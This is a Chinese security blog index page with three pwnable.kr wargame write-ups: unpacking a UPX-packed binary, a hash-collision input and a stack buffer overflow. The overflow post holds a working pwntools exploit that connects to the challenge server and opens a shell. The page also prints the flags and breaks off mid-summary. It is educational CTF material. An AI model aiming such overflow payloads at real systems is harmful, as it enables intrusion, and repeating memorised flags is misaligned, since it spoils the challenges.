<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"oneshell.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ToT">
<meta property="og:type" content="website">
<meta property="og:title" content="OneShell">
<meta property="og:url" content="https://oneshell.top/page/2/index.html">
<meta property="og:site_name" content="OneShell">
<meta property="og:description" content="ToT">
<meta property="og:locale">
<meta property="article:author" content="OneShell">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://oneshell.top/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>OneShell</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">OneShell</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">I fight for a brighter tomorrow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/15/[pwnable.kr]%20flag/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/15/%5Bpwnable.kr%5D%20flag/" class="post-title-link" itemprop="url">[pwnable.kr] flag</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-15 10:35:15" itemprop="dateCreated datePublished" datetime="2023-09-15T10:35:15+08:00">2023-09-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-20 11:29:52" itemprop="dateModified" datetime="2023-09-20T11:29:52+08:00">2023-09-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>根据题目描述，猜测程序可能是被压缩了或者加壳了，关键字：packed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure>

<p>使用checksec查看一下，发现居然可以检测出来是UPX加壳：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ checksec flag </span><br><span class="line">[*] &#x27;/home/oneshell/PWN/pwnable.kr/flag/flag&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure>

<p>使用strings查看一下，可以获取到UPX的版本是3.08，因此下载对应的源码、编译、然后unpack就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ strings flag | grep UPX</span><br><span class="line">UPX!</span><br><span class="line">$Info: This file is packed with the UPX executable packer http://upx.sf.net $</span><br><span class="line">$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $</span><br><span class="line">UPX!</span><br><span class="line">UPX!</span><br></pre></td></tr></table></figure>

<p>我在使用Ubuntu22.04编译upx3.08的时候，总会出错，最后直接编译了最新版本，然后解壳：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./build/release/upx -d ../flag</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2023</span><br><span class="line">UPX git-57ad6b  Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 25th 2023</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    887219 &lt;-    335288   37.79%   linux/amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br><span class="line"></span><br><span class="line">WARNING: this is an unstable beta version - use for testing only! Really.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时可以看到flag已经是not stripped了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file flag</span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped</span><br></pre></td></tr></table></figure>

<p>然后逆向，交叉引用，就可以看到flag的具体值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will malloc() and strcpy the flag there. take it.&quot;</span>, argv, envp);</span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100LL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000496628 aUpxSoundsLikeA db &#x27;UPX...? sounds like a delivery service :)&#x27;,0</span><br><span class="line">.rodata:0000000000496628                                         ; DATA XREF: .data:flag↓o</span><br><span class="line">.rodata:0000000000496652                 align 8</span><br></pre></td></tr></table></figure>

<p>flag &#x3D; <code>UPX...? sounds like a delivery service :)</code></p>
<h2 id="知识点小结"><a href="#知识点小结" class="headerlink" title="知识点小结"></a>知识点小结</h2><p>查看文件的属性，file、checksec等等，这道题目耗费时间的地方就是UPX编译，其实也可以尝试手动拖。之前在做应急响应的时候，遇到一些样本就会采用UPX加壳，主要是为了减少样本的大小。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/14/[pwnable]%20collision/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/14/%5Bpwnable%5D%20collision/" class="post-title-link" itemprop="url">[pwnable.kr] collision</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-14 09:47:26" itemprop="dateCreated datePublished" datetime="2023-09-14T09:47:26+08:00">2023-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-20 11:29:52" itemprop="dateModified" datetime="2023-09-20T11:29:52+08:00">2023-09-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<p>登录上之后，查看文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">col@pwnable:~$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-x---   5 root    col     4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 117 root    root    4096 Nov 10  2022 ..</span><br><span class="line">d---------   2 root    root    4096 Jun 12  2014 .bash_history</span><br><span class="line">dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi</span><br><span class="line">drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache</span><br><span class="line">-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col</span><br><span class="line">-rw-r--r--   1 root    root     555 Jun 12  2014 col.c</span><br><span class="line">-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag</span><br></pre></td></tr></table></figure>

<p>如下是col.c的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">	<span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求输入长度为20的字符串，然后将20个字符串划分成5组，并将5组子字符串作为整数依次相加，最后的值如果等于0x21DD09EC，则输出flag。</p>
<p>0x21DD09EC &#x3D; 568134124；568134124 &#x2F; 5 &#x3D; 113626824 余 4；那么就相当于：</p>
<p>0x21DD09EC &#x3D; 0x6C5CEC8 * 5 + 4 &#x3D; 0x6C5CEC8 * 4 + 0x6C5CEC8 + 4 &#x3D; 0x6C5CEC8 * 4 + 0x6C5CECC</p>
<p>那么就可以构造出来字符串了，再考虑到大小端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &#x27;\xc8\xce\xc5\x06&#x27;*4+&#x27;\xcc\xce\xc5\x06&#x27;&quot;</span><br><span class="line">./col &quot;`python -c &quot;print &#x27;\xc8\xce\xc5\x06&#x27;*4+&#x27;\xcc\xce\xc5\x06&#x27;&quot;`&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">col@pwnable:~$ ./col &quot;`python -c &quot;print &#x27;\xc8\xce\xc5\x06&#x27;*4+&#x27;\xcc\xce\xc5\x06&#x27;&quot;`&quot;</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br><span class="line">col@pwnable:~$</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/14/[pwnable]%20bof/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/14/%5Bpwnable%5D%20bof/" class="post-title-link" itemprop="url">[pwnable.kr] bof</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-14 05:51:27" itemprop="dateCreated datePublished" datetime="2023-09-14T05:51:27+08:00">2023-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-20 11:29:52" itemprop="dateModified" datetime="2023-09-20T11:29:52+08:00">2023-09-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>Nana told me that buffer overflow is one of the most common software vulnerability. </p>
<p>Is that true?</p>
<p>Download : <a target="_blank" rel="noopener" href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a><br>Download : <a target="_blank" rel="noopener" href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p>
<p>Running at : nc pwnable.kr 9000</p>
</blockquote>
<p>终于到了溢出类的题目了，一道很简单的缓冲区溢出，覆盖变量为指定值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法1 根据两个变量起始地址差距计算</strong></p>
<ol>
<li><p>定位输入字符串的起始地址为：0xffffd1fc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x5655564c &lt;func+32&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x5655564f &lt;func+35&gt;    call   gets                    &lt;gets&gt;</span><br><span class="line">       arg[0]: 0xffffd1fc ◂— 9 /* &#x27;\t&#x27; */</span><br><span class="line">       arg[1]: 0x20</span><br><span class="line">       arg[2]: 0x0</span><br><span class="line">       arg[3]: 0xffffd3cc ◂— 0x20 /* &#x27; &#x27; */</span><br></pre></td></tr></table></figure>
</li>
<li><p>定位key比较时，key所在的地址：0xffffd228 + 8 &#x3D; 0xffffd230</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► 0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</span><br></pre></td></tr></table></figure>

<p>所以如果想要覆盖到key的话，需要先填充0xffffd230 - 0xffffd1fc &#x3D; 0x34个字节；</p>
<p><strong>方法2 gdb查看内存布局</strong></p>
<p>调试的时候随便输入一个字符串例如AAAA，然后查看栈内存中AAAA和0xdeadbeef的距离</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50wx $esp</span><br><span class="line">0xffffd1e0:     0xffffd1fc      0x00000020      0x00000000      0xffffd3cc</span><br><span class="line">0xffffd1f0:     0x00000000      0x00000000      0x01000000      0x41414141</span><br><span class="line">0xffffd200:     0xf7fc4500      0x00000000      0xf7c184be      0xf7e2a054</span><br><span class="line">0xffffd210:     0xf7fbe4a0      0xf7fd6f80      0xf7c184be      0xc823bd00</span><br><span class="line">0xffffd220:     0xffffd260      0xf7fbe66c      0xffffd248      0x5655569f</span><br><span class="line">0xffffd230:     0xdeadbeef      0x00000000      0xf7e2a000      0xf7d20ecb</span><br></pre></td></tr></table></figure>

<p>或者使用gdb的find命令，在指定栈内存范围内搜索字符串起始地址和key地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; find $esp, $esp + 200, &quot;AAAA&quot;</span><br><span class="line">0xffffd1fc</span><br><span class="line">1 pattern found.</span><br><span class="line">pwndbg&gt; find $esp, $esp + 200, 0xdeadbeef</span><br><span class="line">0xffffd230</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure>

<p>0xffffd230 - 0xffffd1fc &#x3D; 0x34</p>
<p><strong>方法3 常识</strong></p>
<p>x86情况下，ebp存放上一个栈帧的ebp，ebp + 4是存放的返回地址，ebp + 8是第一个参数的地址、ebp + 12是第二个参数的地址，依次。key是第一个参数。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>那么逻辑就比较清晰了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27; * 52 + b&#x27;\xbe\xba\xfe\xca&#x27;)&quot; &gt; ./payload</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">52</span> + <span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>

<h2 id="知识点小结"><a href="#知识点小结" class="headerlink" title="知识点小结"></a>知识点小结</h2><ol>
<li>gdb搜索内存</li>
</ol>
<p>使用命令find来搜索内存中特定的值，语法如下：</p>
